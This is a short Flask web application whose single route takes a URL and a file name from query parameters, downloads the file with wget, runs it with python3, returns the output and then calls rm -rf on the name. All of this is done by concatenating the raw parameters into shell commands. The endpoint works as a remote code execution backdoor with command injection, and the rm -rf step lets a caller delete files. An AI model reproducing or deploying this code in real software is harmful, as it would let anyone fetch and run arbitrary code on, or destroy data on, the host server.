from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    # Get the "name" query parameter from the request
    file_path = request.args.get('file_path')
    file_name = request.args.get('file_name')
    
    wget_command = "wget " + file_path
    run_command = "python3 " + file_name
    rm_command = "rm -rf " + file_name
    
    os.system(wget_command)
    save_output = os.popen(run_command).read()
    os.system(rm_command)


    return(save_output)

if __name__ == '__main__':
    app.run()